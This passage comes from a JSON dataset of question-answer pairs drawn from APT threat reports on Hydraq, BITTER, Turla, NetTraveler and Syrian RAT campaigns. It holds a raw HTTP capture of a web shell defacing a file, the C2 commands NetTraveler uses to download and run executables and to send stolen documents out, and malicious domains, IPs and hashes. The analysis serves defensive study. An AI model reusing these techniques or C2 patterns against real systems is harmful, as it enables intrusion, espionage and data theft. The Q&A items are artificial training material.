compromised system during the ACKnowledgement phase, and how is this information encrypted?",
    "output": "During the ACKnowledgement phase, the Hydraq server collects the following information from the compromised system: computer name, CPU clock speed, memory status (amount of actual physical memory in bytes converted to megabytes), and operating system information. This information is first encrypted using a custom encryption method where the key is derived from the result of the GetTickCount API. The encrypted data is then further encrypted using a bitwise NOT operation. Additionally, a CRC hash value of the encrypted information is generated before sending it to the client.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: GET /ZHC_Shell_1.0.aspx?action=edit&src=c%3a%5cinetpub%5cwwwroot%5cTEST_FILE.TXT HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nReferer: http://192.168.1.1/ZHC_Shell_1.0.aspx\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASP.NET_SessionId=fqcod255iety0a55x3acuaqe\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 21:09:48 GMT\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nContent-Length: 3555\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<p align=\"center\"><img alt=\"\" title=\"\" src=\"http://img851.imageshack.us/img851/2304/bismillahus.jpg\" /><br />\n</p>\n<div align=\"center\"></div>\n<style type=\"text/css\"> body,td,th { color: #FFFFFF; font-family: Comic Sans Ms;\n}\nbody { background-image: url(\"http://a6.sphotos.ak.fbcdn.net/hphotos-aksnc6/262108_109964339097628_100002521874736_97359_1521760_n.jpg\"); background-position: center center; background-repeat: no-repeat; background-color: #000000; background-attachment: fixed; font-family: Comic Sans MS; font-size: 16px;\n}\na:link { color: #FFFFFF; text-decoration: none;\n} a:visited { text-decoration: none; color: #FFFFFF;\n}\na:hover { text-decoration: none; color: #00FF00;\n}\na:active { text-decoration: none; color: #00FF00;\n}\n.button {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}\n.TextBox {border: 1px solid #084B8E}\n.style3 {color: #00FF00}\n.text {font-family: Comic Sans MS; font-size: 18px}\n.title {font-family: Comic Sans MS; font-size: 22px;}\n.footer {font-size: 12px;}\n</style>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html\">\n<title>Aspx Shell By XXx_Death_xXX & ZHC</title>\n</head>\n<body> <form name=\"ctl11\" method=\"post\" action=\"ZHC_Shell_1.0.aspx?action=edit&amp;src=c%3a%5cinetpub%5cwwwroot%5cTEST_FIL\nE.TXT\" id=\"ctl11\" enctype=\"multipart/form-data\">\n<div>\n<input type=\"hidden\" name=\"__EVENTTARGET\" id=\"__EVENTTARGET\" value=\"\" />\n<input type=\"hidden\" name=\"__EVENTARGUMENT\" id=\"__EVENTARGUMENT\" value=\"\" />\n<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"/wEPDwULLTEzODY2ODE5NzYPZBYCAgsPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb 3JtLWRhdGFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBQdOZXdGaWxlBQx OZXdEaXJlY3RvcnkFDE5ld0RpcmVjdG9yeVsWlNx5Na0HFMN2RRO+ceR1t+aS\" /> </div>\n<script type=\"text/javascript\">\n//<![CDATA[ var theForm = document.forms['ctl11']; if (!theForm) { theForm = document.ctl11;\n} function __doPostBack(eventTarget, eventArgument) { if (!theForm.onsubmit || (theForm.onsubmit() != false)) { theForm.__EVENTTARGET.value = eventTarget; theForm.__EVENTARGUMENT.value = eventArgument; theForm.submit(); }\n}\n//]]> </script>\n<table width=\"80%\"  border=\"1\" align=\"center\"> <tr> <td width=\"11%\">Path</td>\n<td width=\"89%\"> <input name=\"filepath\" type=\"text\" value=\"c:\\inetpub\\wwwroot\\TEST_FILE.TXT\" id=\"filepath\" class=\"TextBox\" style=\"width:300px;\" />\n*</td>\n</tr>\n<tr>\n<td>Content</td> <td> <textarea name=\"content\" rows=\"25\" cols=\"100\" id=\"content\" class=\"TextBox\">DATA IN\nVery Small Headline: &quot;TEST_FILE.TXT&quot;.</textarea></td>\n</tr> <tr>\n<td></td> <td> <input type=\"submit\" name=\"a\" value=\"Sumbit\" id=\"a\" class=\"button\" />\n</td>\n</tr>\n</table>\n<div>\n.<input type=\"hidden\" name=\"__EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\"/wEWBALrm6SaCAKwgsKBDALW4bf/BAK/76ruDDFHkmmcWzwDRZCn6yFg1uYyRvu7\" /> </div></form>\n</p> <script language=\"javascript\"> function closewindow()\n{self.close();}\n</script> <b><p align=\"center\" valign=\"bottom\" class=\"footer\">ZHC Shell 1.0&nbsp;&bull;&nbsp;2011<br/>\nBy XXx_Death_xXX Of <a href=\"http://www.zone-hack.com\" target=\"_blank\" title=\"Welcome to ZHC SHEll\"> ZCompany Hacking Crew</a>&nbsp;&bull;&nbsp;zone-hack.com #ZHC</p></b> </body> </html>\n---- REQUEST ----\nVery Small Headline: POST /ZHC_Shell_1.0.aspx?action=edit&src=c%3a%5cinetpub%5cwwwroot%5cTEST_FILE.TXT HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nReferer: http://192.168.1.1/ZHC_Shell_1.0.aspx?action=edit&src=c%3a%5cinetpub%5cwwwroot%5cTEST _FILE.TXT\nAccept-Language: en-us\nContent-Type: multipart/form-data; boundary=---------------------------7de26c3b270192\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nContent-Length: 1096\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: ASP.NET_SessionId=fqcod255iety0a55x3acuaqe\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"__EVENTTARGET\"\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"__EVENTARGUMENT\"\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\n/wEPDwULLTEzODY2ODE5NzYPZBYCAgsPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLW RhdGFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBQdOZXdGaWxlBQxOZXd EaXJlY3RvcnkFDE5ld0RpcmVjdG9yeVsWlNx5Na0HFMN2RRO+ceR1t+aS\n-----------------------------7de26c3b270192\nfilepath\nContent-Disposition: form-data; name=\"\"\nc:\\inetpub\\wwwroot\\TEST_FILE.TXT\n-----------------------------7de26c3b270192\ncontent\nContent-Disposition: form-data; name=\"\"\nVery Small Headline: Hacked by STTEAM!\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"a\"\nSumbit\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"__EVENTVALIDATION\"\n/wEWBALrm6SaCAKwgsKBDALW4bf/BAK/76ruDDFHkmmcWzwDRZCn6yFg1uYyRvu7 -----------------------------7de26c3b270192--\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 21:09:59 GMT\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nContent-Length: 3749\n<script>alert('Edit|Creat c:\\\\inetpub\\\\wwwroot\\\\TEST_FILE.TXT\nSuccess!');location.href='/ZHC_Shell_1.0.aspx?action=goto&src=c%3a%5cinetpub%5cwwwroot% 5c'</script>\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<p align=\"center\"><img alt=\"\" title=\"\" src=\"http://img851.imageshack.us/img851/2304/bismillahus.jpg\" /><br />\n</p>\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html\">\n<title>Aspx Shell By XXx_Death_xXX & ZHC</title>\n</head>\n<body>\n<form name=\"ctl11\" method=\"post\" action=\"ZHC_Shell_1.0.aspx?action=edit&amp;src=c%3a%5cinetpub%5cwwwroot%5cTEST_FIL E.TXT\" id=\"ctl11\" enctype=\"multipart/form-data\">\n<div>\n<input type=\"hidden\" name=\"__EVENTTARGET\" id=\"__EVENTTARGET\" value=\"\" />\n<input type=\"hidden\" name=\"__EVENTARGUMENT\" id=\"__EVENTARGUMENT\" value=\"\" />\n<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"/wEPDwULLTEzODY2ODE5NzYPZBYCAgsPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb 3JtLWRhdGFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYEBQdOZXdGaWxlBQd OZXdGaWxlBQxOZXdEaXJlY3RvcnkFDE5ld0RpcmVjdG9yecjgjhjkSsSPowbSdyPqLK8RvfwA\" />\n</div>\n<script type=\"text/javascript\">\n//<![CDATA[ var theForm = document.forms['ctl11']; if (!theForm) { theForm = document.ctl11;\nVery Small Headline: Hacked by STTEAM!</textarea></td>\n</tr>\n<tr>\n<td></td>\n<td> <input type=\"submit\" name=\"a\" value=\"Sumbit\" id=\"a\" class=\"button\" />\n</td>\n</tr>\n</table>\n<div>\n.<input type=\"hidden\" name=\"__EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\"/wEWBAKVzdKBCwKwgsKBDALW4bf/BAK/76ruDA40iO6cLOK3TeAbqxG5L91EeqiK\" /> </div></form>\n</p>\n<script language=\"javascript\"> function closewindow()\n{self.close();}\n</script>\n<b><p align=\"center\" valign=\"bottom\" class=\"footer\">ZHC Shell 1.0&nbsp;&bull;&nbsp;2011<br/> By XXx_Death_xXX Of <a href=\"http://www.zone-hack.com\" target=\"_blank\" title=\"Welcome to ZHC SHEll\"> ZCompany Hacking Crew</a>&nbsp;&bull;&nbsp;zone-hack.com #ZHC</p></b> </body>\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\nThe following window was displayed during this operation:\n- \"File Downloaded\" from Victim system into the attacker's system Filename: \"TEST_FILE.txt\"\n\nHow does the 'K-Shell/ZHC Shell 1.0/Aspx Shell' backdoor facilitate file manipulation, and what specific actions can an attacker perform using this functionality?",
    "output": "The 'K-Shell/ZHC Shell 1.0/Aspx Shell' backdoor facilitates file manipulation by allowing the attacker to interact with files on the compromised system through a web interface. Specific actions that an attacker can perform include uploading, downloading, copying, deleting, modifying, and searching for files. For example, the attacker can edit a file located at 'c:\\\\inetpub\\\\wwwroot\\\\TEST_FILE.TXT' by submitting a form with the new content. This is evident from the request and response data provided, where the attacker successfully edits the file and receives a confirmation message.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: RAT Component\nBITTER used RATs that are compiled using Microsoft Visual C++ 8.0. They use a few iterations of their RAT with the main difference being the RAT's command and control (C2) communication method. Earlier variants communicated to its C2 via an unencrypted HTTP POST. Below is an example of an older variant's phone home request:\nNewer ones, on the other hand, use encrypted TCP connection such as the one shown in the introduction above. Both older and newer variants are used simultaneously today in the campaign.\nThe RAT version (SHA1 d7a770233848f42c5e1d5f4b88472f7cb12d5f3d) that they used in their latest campaign is capable of executing the following backdoor capabilities, essentially allowing the attackers to gain full remote control over a victim's PC:\nGet system information - computer name, current user name, and operating system\nEnumerate logical drives\nEnumerate and log files and their corresponding timestamps\nOpen a remote command shell\nList processes with active UDP connections\nManipulate running processes\nManipulate files\nDownload a file\nIn addition, the vast majority of their RAT binaries contained the following digital signature with a non-trusted CA Root certificate:\nThe following table shows the timeline of appearance of BITTER RATs, based on their compilation timestamps, along with their embedded PDB paths:\nIt is important to note that some of these RATs are distributed at a later time than their compilation date.\nBig Headline: Command and Control\nBITTER used free dynamic DNS (DDNS) and dedicated server hosting services in order to set up their C2s. The download site where the exploit documents download the RAT binaries are, in most cases, different from the actual RAT C2. However, both of them are typically registered using a Gmail email address and a spoofed identity purporting to be either from United Kingdom or Great Britain. Below is an example of a spoofed registrant information for the C2, spiralbook71[.]com:\nA list of all related malicious domains we managed to collect are as follows:\nThe email address witribehelp@gmail.com points to an empty Google Plus profile with the name \"WhatsApp Support\". Interestingly, however, the account is connected to another Google Plus account with the handle \"Love Pakistan\":\nBig Headline: Intent\nWhile cyber-espionage is a common motivation for targeted attacks, this is often hard to conclude unless a forensic investigation is conducted on the actual victims' machines. In some cases, specific capabilities in RATs provides us with clues on what the attackers' true intents are.\nOne of the backdoor capabilities mentioned above is the logging of files and files' time stamps from the victim's machine. Furthermore, an older variant of their RAT from 2014 that has the SHA1 3ab4ce4b3a44c96d6c454efcece774b33335dda2 are found to look for more specific file types. After identifying the logical drives from a victim PC, this RAT variant proceeds to enumerate files and check if they match any of the hard coded document and archive file extensions below:\nWhile it is hard to conclude based only on these artifacts, the nature of these targeted file types suggests that the attackers may be after sensitive documents.\nBig Headline: Other Tools Used\nIn December 2015 one of the campaign's download sites hosted a binary at scholars90[.]website/putty. The downloaded file is a free SSH and Telnet client application called \"PuTTY\", which has been used in the past in other targeted attacks.\nIn addition, the same RAT variant previously mentioned (SHA1 3ab4ce4b3a44c96d6c454efcece774b33335dda2) connects to the C2 info2t[.]com/m2s.php. This has also served as a C2 for at least two AndroRAT variants in the past. The following diagram shows these relationships:\nAndroRAT is an open source remote administration tool for Android. Its GitHub repository lists the following capabilities:\nGet contacts (and all theirs informations)\nGet call logs\nGet all messages\nLocation by GPS/Network\nMonitoring received messages in live\nMonitoring phone state in live (call received, call sent, call missed..)\nTake a picture from the camera\nStream sound from microphone (or other sources..)\nStreaming video (for activity based client only)\nDo a toast\nSend a text message\nGive call\nOpen an URL in the default browser\nDo vibrate the phone\nThe AndroRAT variant with SHA1 7d47ae3114f08ecf7fb473b7f5571d70cf2556da disguises itself as the Islam Adhan Alarm - an Android app that alerts to prayer times of Islam, which is the state religion of Pakistan. The variant with SHA1 645a6e53116f1fd7ece91549172480c0c78df0f, on the other hand, disguises itself as Kashmir News app. Kashmir is the northernmost geographical region of South Asia and is a disputed territory between India and Pakistan.\nBig Headline: Conclusion\nMany targeted attacks continue to be discovered today. It is interesting to see that while these attacks are not always sophisticated in nature, the same characteristic allows them to stay under the radar by blending in with common attacks in the wild. BITTER is able to achieve this by using available online services such as free DDNS, dedicated server hosting and Gmail to setup their C2s. Such setup is exhibited by today's common malware.\nIt is worth noting that in all the artifacts collected in this research, none of the English words that were used had spelling errors, suggesting that the actors behind BITTER are proficient in the English language. Furthermore, as discussed above, all the artifacts we have seen are consistent with Pakistan being the target of this group. There may be other targets that have not been discovered yet or BITTER may be a branch of a larger\ncampaign with broader targets, but only time will tell whether any of these are correct.\nQ: Why might the BITTER APT group be interested in specific file types, and what does this suggest about their motivations and potential targets?",
    "output": "The BITTER APT group's interest in specific file types, such as document and archive file extensions, suggests that they are likely targeting sensitive documents. An older variant of their RAT from 2014 was found to look for these specific file types after identifying logical drives on a victim's PC. This behavior indicates that the attackers may be motivated by cyber-espionage, aiming to steal confidential information. The nature of these targeted file types aligns with the goal of gathering intelligence, which could be particularly relevant for government or corporate espionage activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: 4.2 Syria\nThe use of RATs against the opposition has been a well-documented feature of the Syrian Civil War since the first reports were published in early 2012 [36, 39, 40, 32, 34]. The phenomenon is widespread, and in our experience, most members of the opposition know that some hacking is taking place. As summarized in Table 3, the attacks often include fake or maliciously packaged security tools; intriguing, or ideological, or movement-relevant content (e.g. lists of wanted persons). The seeding techniques and bait files suggest a good understanding of the opposition's needs, fears and behavior, coupled with basic familiarity with off-the-shelf RATs. In some cases attacks occur in a context that points to a more direct connection to one of the belligerents: the Syrian opposition has regularly observed that detainees' accounts begin seeding malware shortly after their arrest by government forces [41].\nResearchers and security professionals have already profiled many of these RATs, including DarkComet [42, 43], Black-shades Remote Controller [38], Xtreme RAT [44], njRAT [26], and ShadowTech [36]. Some are available for purchase by anyone, in contrast to \"government only\" FinSpy and RCS. For example, Xtreme RAT retails for e350, while a version of Black-shades lists for e40. Others, like DarkComet, are free. We have also observed cracked versions of these RATs on Arabic-language hacker forums, making them available with little effort and no payment trail. While the RATs are cheaper and less\nsophisticated than FinSpy and RCS, they share the same basic functionality, including screen capture, keylogging, remote monitoring of webcams and microphones, remote shell, and file exfiltration.\n6YahooMail and the iPhone mail client automatically load these remote images, especially in e-mails spoofed from trusted senders.\nIn the most common attack sequence we observed, illustrated with three examples in Figure 3, the attacker seeds malware via private chat messages, posts in opposition-controlled social media groups, or e-mail. These techniques often limit the world-visibility of malicious files and links, slowing their detection by common AV products. Typically, targets receive either (1) a PE in a .zip or .rar, (2) a file download link, or (3) a link that will trigger a drive-by download. The messages usually include text, often in Arabic, that attempts to persuade the target to execute the file or click the link.\nThe first attacks in Figure 3 date to 2012, and use bait files with a DarkComet RAT payload. These attacks share the same C&C, 216.6.0.28, a Syrian IP address belonging to the Syrian Telecommunications Establishment, and publicly reported as a C&C of Syrian malware since February 2012 [45]. The first bait file presents to the victim as a PDF containing information about a planned uprising in Aleppo. In fact the file is a Windows Screensaver (.scr) that masquerades as a PDF using Unicode RLO, rendering a name such as \".fdp.scr\" display to the victim as \".rcs.pdf.\" The second bait file is a dummy program containing DarkComet while masquerading as a Skype call encryption program, playing to opposition paranoia about government backdoors in common software. The third attack in Figure 3, observed in October 2013, entices targets with e-mails purporting to contain or link to videos about the current conflict, infecting victims with Xtreme RAT, and using the C&C tn1.linkpc.net.\nFor seeding, the attackers typically use compromised accounts (including those of arrested individuals) or fake identities masquerading as pro-opposition. Our illustration shows in abstract terms the use of Victim A's account to seed malware (\"Aleppo Plan\") via (say) Skype messages to Victim(s) Bn . In the cases of Opp. Member C and NGO Worker D (here, actual victims, not abstract), targeting was by e-mail from domains apparently belonging to opposition groups, indicating a potential compromise. One domain remains active, hosting a website of the Salafist Al-Nusra front [46], while the other appears dormant. Opp. Member C received a malicious file as an e-mail attachment, while NGO Worker D was sent a shortened link (url[.]no/Uu5) to a download from a directory of Mrconstrucciones[.]net, 7 a site that may have been compromised. Both attacks resulted in an Xtreme RAT infection.\nInterestingly, in the case of the fake Skype encryption the deception extended to a YouTube video from \"IT Security Lab\" [47] demonstrating the program's purported capabilities, as well as a website promoting the tool, skype-encryption.sytes.net. The attackers also constructed a basic, faux GUI for their \"Encryption\" program (see Figure 4). The fake GUI has a number of non-functional buttons like \"Encrypt\" and \"DeCrypt,\" which generate fake prompts. While distracted by this meaningless interaction, the victim's machine is infected with DarkComet 3.3 [32, 33].\nAnecdotally, campaign volume appears to track significant\n7Obfuscated to avoid accidental clicks on active malware URLs.\nknown vulnerability with no patch at the time that the e-mails were sent. Oracle released a patch 12 hours after activists began receiving these links.\nThe cedarkeyrv.com domain is associated with an RV park in Cedar Key, Florida. The website's hosting company told us that the site had apparently suffered a compromise, but did not have further details.\nThe exploit used in the attack appears to have been originally posted by a Kuwaiti user, njq8, on an Arabic-language exploit sharing site [65]. We contacted njq8, who told us that he had obtained the exploit elsewhere and modified it prior to posting. The attack downloaded an instance of SpyNet from isteeler.com (which from our inspection did not appear to have any legitimate content), which used the C&C storge.myftp.org. This same C&C occurred in another attack (Figure 6) targeting Relative of political detainee D; in that case, the payload was a freely-available RAT known as njRAT, written by the same njq8 as the exploit-poster discussed above. However, we did not find any other evidence suggesting njq8's involvement in either attack.\nMore SpyNet attacks: The domain hamas.sytes.net, which we previously saw used by two SpyNet samples, resolved to 67.205.79.177. Historically, dreems.no-ip.ca also resolved to this address. An unidentified dropper using this C&C targeted Journalist F;a SpyNet attack on Relative of political detainee D also used this C&C. In that latter case, the sample arrived via e-mail in a .rar attachment that contained an .scr file disguised as a Word document. The .scr file was a self-extracting archive that decompressed and ran both the bait document and the payload. The SMTP source of the e-mail was webmail.upload.bz.\nAppin: In early 2013 UAE H.R. activist E forwarded numerous documents that included a particular CVE-2012-0158 exploit for Microsoft Word. In all, these totaled 17 distinct hashes of documents, and 10 distinct hashes of payloads (some documents that differed in their hash downloaded the same payload). The exploits primarily downloaded instances of SpyNet from upload.bz, which for the most part communicated with C&C at sn.all-google.com. This domain was also used for C&C in other attacks, including that on Journalist C.\nTwo of the other CVE-2012-0158 exploits downloaded DarkComet from www.getmedia.us and www.technopenta.com after posting system information to random123.site11.com. All three domains match those used by an Indian cybermercenary group said to be linked to Appin Security Group [66]. The former two domains hosted content other than spyware (i.e., they may have been compromised). We alerted the owner of www.getmedia.us, who removed the payloads.\nMedium Headline: 5 Empirical characterization\nThe samples we received afforded us an opportunity to empirically characterize the use of FinFisher and Hacking Team around the world, enabling us to assess their prevalence, and identify other country cases that may warrant future investigation. We analyzed the samples and the behavior of their C&C\nservers to develop indicators (fingerprints) for how the servers respond to certain types of requests. We then scanned the full Internet IPv4 address space (\"/0\") for these, along with probing results found by past scans. In many cases we do not release the full details of our fingerprints to avoid compromising what may be legitimate investigations.\n\nHow do the attackers in Syria leverage Remote Access Trojans (RATs) to target opposition members, and what are some of the specific RATs used?",
    "output": "Attackers in Syria use RATs to target opposition members by seeding malware through private chat messages, social media groups, or emails. They often use fake or maliciously packaged security tools, or content that is ideologically relevant to the opposition. Specific RATs used include DarkComet, Blackshades Remote Controller, Xtreme RAT, njRAT, and ShadowTech. These RATs are either available for purchase or can be found in cracked versions on Arabic-language hacker forums. They share basic functionalities such as screen capture, keylogging, remote monitoring of webcams and microphones, remote shell, and file exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What evidence indicates that Etumbot is used in conjunction with IXESHE malware, and what are some of the shared C&C infrastructure details?",
    "output": "Several Etumbot samples connect directly to IP addresses that are also used by IXESHE-related malware, indicating that Etumbot is often used in tandem with IXESHE. For example, the domain finance[.]yesplusno[.]com and IP address 211[.]53.164.152 have been used by both Etumbot and IXESHE samples. The registrant for the domain yesplusno[.]com is listed as 'alice yoker' with the email address 'chuni_fan@sina.com'. Other domains registered in this name have also been used as C&C for IXESHE, such as securezone[.]yesplusno[.]com, prishmobile[.]googlesale[.]net, and yahoopush[.]googlesale[.]net. Additionally, the IP address 98.188.111.244 has been used as a C&C for multiple IXESHE samples, beginning in at least March 2013 and observed as recently as March 2014 with an Etumbot sample.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Turla APT group achieve persistence in the Neuron and Nautilus malware, allowing them to maintain their foothold on infected systems?",
    "output": "The Turla APT group achieves persistence in the Neuron and Nautilus malware through various techniques. In the Neuron client, persistence is established by creating a scheduled task that runs every 12 minutes, with a task ID of 'Microsoft Corporation' and a task description constructed from a string retrieved from a randomly selected registry value. This allows the malware to maintain its foothold on the system even after a reboot. Additionally, the Neuron service is typically installed on compromised infrastructure such as mail and web servers, and listens for HTTP requests from infected clients, acting as a Command & Control (C2) server inside the victim network. This enables the actor to evade detection by network gateway-based monitoring. In the Nautilus malware, persistence is achieved through the use of a covert store on disk, which is located in '\\ProgramData\\Microsoft\\Windows\\Caches\\'. The loader DLL accesses this covert store to decrypt the payload, which is then loaded into a target process via reflective loading. The Nautilus service also listens for HTTP requests from clients to process tasking requests, allowing the actor to maintain their foothold on the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Filesystem scAn\nthe malware has a file enumeration routine, which gets the settings from dnlist.ini (such as directory paths to process) and launches a recursive directory search. the output is saved to enumfs.ini file in the following format:\n[Computer]\nName=<Local system name>\nPage=<Current Windows ANSI code page (ACP)>\n[<Local system name>]\nd1=<string>\nd2=<string>\n\u2026\nd<N>=<string>\ndircount=<N>\n[<d1 string>]\nf1=<string>\nf2=<string>\n\u2026\nf<M>=<string>\nd1=<string>\nd2=<string>\n\u2026\nd<K>=<string>\ndircount=<K>\nfilecount=<M>\n[<d2 string>]\n\u2026\nAfter execution, this log file contains directories with all filenames and subdirectories. only di-rectory/file names are stored, with no additional data such as timestamps or size. When the search is finished, the module saves current date to the dnlist.ini file and changes option scanAll, see format below. this is done to avoid recurrent scanning of the filesystem, which is normally a heavy process and might be noticed by local user or an administrator.\n[EnumTime]\nDateTime=<YYYY-MM-DD date>\n[ScanList]\nScanAll=False\nAfter scanning the local filesystem, enumfs. ini file is uploaded to the server via httP Get request described above (see the submission process of stat_t.ini file in the beginning of c&c communication part) with filename of the following format:\nfilelist-<month><Day>-<hour><minute>\n<Second>.ini\nVery Small Headline: uPloAdinG Files\nthe next stage of this thread uploads files interesting for the attacker to the c&c server. this process is described below.\nthe module works with files described in dnlist. ini file. it gets a list of file extensions that must be uploaded to the c&c first. there is a default list of extensions (value Types of section [other]) that represent interest for the attackers: doc,docx,xls,xlsx,txt,rtf,pdf. then it gets file-total values from [filelist] section of dnlist.ini and iterates through every f<N> value, where n is a positive integer starting from 1.\nthere are several tests applied to each file, before it is uploaded to the server, including the following:\n> File size must not be larger than ~10mb (10'485'760 bytes).\n> File must have one of the extensions from the \"types\" option.\nif the file matches the criterias, then a unique file state identifier for that file is created, which is an md5 hash of the following string: \"<filename> <year>-<month>-<Day> <hour>:<minute>:<Second>:<millisec-onds>\". the date and time values in the string before are obtained from the file last change time.\nAfter that the module creates a name used for uploading the file to the server, which consists of the following: \"<year>-<month>-<Day>-<hour>-<minute>-<file state identifier, the mD5>\". the time and date values are also taken from the file's last change time. this file is uploaded to the c&c using the same procedure as used before for uploading other files.\nAfter that, thread1 attempts to upload a file called uenumfs.ini, which is created by the thread2. the remote filename is set to the following \"ufilel-ist-<month><Day>-<hour><minute><Sec-ond>.ini\".\nnext, the thread iterates through %Temp%\\ ntvba00.tmp\\ directory and uploads every file located there. the file names are preserved as they are.\nVery Small Headline: control Procedure\nthen, the thread issues a special httP Get request to get next control instruction from the c&c. this is done by accessing the following uri:\nhXXp://vip222idc.s169.288idc.com/nt12/newyork/ city/nettraveler.asp?action=getdata (3)\nserver response is converted to uppercase and analyzed. there is defined set of responses expected from the c&c server:\n01. <botid>:uninstAll\nthis command simply uninstalls the malicious service from the registry and deletes locally created files.\n02. <botid>:uPdAte\nthis procedure starts from uninstalling current service, then it issues three httP Get requests to the c&c script url:\nGET .../newyork/city/nettraveler.asp?action=data-size to get the size of updated module that will be pushed with next request.\nGET .../newyork/city/../updata.exe to get the updated module to be executed. this module is instantly saved to %Windir%\\install.exe and executed.\n03. <botid>:reset\nthis procedure simply removes all temporary files, such as the following:\n> %sysdir%\\enumfs.ini\n> %sysdir%\\dnlist.ini\n> %sysdir%\\udidx.ini\n> %sysdir%\\uenumfs.ini\n> %sysdir%\\stat_t.ini\n04. <botid>:uPloAd\nthis procedure is identical to the uPdAte command described before with one difference - no uninstallation of the current module is done, only new executable is downloaded and started. this method is probably used to execute additional independent malicious executable, unrelated to the original nettraveler malware. or it can be used to infect with the nettraveler backdoor configured for some other c&c server.\nAfter processing any of the commands above the malware issues the following request to the server to confirm command execution:\nGET .../newyork/city/nettraveler.asp?action=updat-ed&hostid=<BotId>\nif the server hasn't issued the uninstAll command the thread continues execution starting from the beginning of the control loop (see above).\nVery Small Headline: threAd2 (driVe monitorinG threAd)\nthis thread creates a hidden window with class name \"NTmainWndclass\" and processes window messages in a loop until it is interrupted by special variable value. the window procedure processes only one window message, Wm_De-vicechaNGe with wParam value set to DbT_ Devicearrival, which is sent by the system when a new removable device such as usb flash drive or network shared folder is attached to the system.\nthe module will proceed only if the attached removable device has provided a disk volume. it is designed to have different procedures for removable disk drives from usb flash and network shares.\nthe usb drives will be processed only if GSearch value is set to true in [other] section of dnlist. ini file. similarly, a new network drive will be processed only if uSearch value is set to true in [other] section of dnlist.ini file.\nboth network and removable usb drives are processed in the same procedure, which reads the following values from dnlist.ini file:\n[Other]\nUTypeLimit=<boolean, default True>\nUAuto=<boolean, default False>\nif uAuto option is set to true, the thread creates %Temp%\\ntvba00.tmp\\ directory and opens\nuenumfs.ini file for writing. the latter is filled with directories and subdirectories listings of the attached disk drive. the format of the data in uenumfs.ini is almost identical to the one created during fixed drive filesystem scan (see \"Filesys-tem scan\" part in thread1 description above).\nin addition to that, the same criterias are applied to each file (size and file extension) as in fixed drive filesystem scan. Also, every file gets a state id calculated as md5 hash of the filename and timestamp of the last modification. this hash is used to generate a new filepath in the following format: %Temp%\\ntvba00.tmp\\<year><month>-<Day>-<hour>-<minute>-<file state id, mD5 hexadecimal string>.<original extension>. the source file from newly attached drive is then copied to the destination set by the generated file path. Please note, that the file original extension is preserved, while the file name is changed. that is used to prevent further problems when working with unsupported encoding.\nAt the same time when file is copied to ntvba00. tmp directory, a record is added to udxidx.ini file, which has the following format:\n[Index]\n<File state id, MD5 hexadecimal 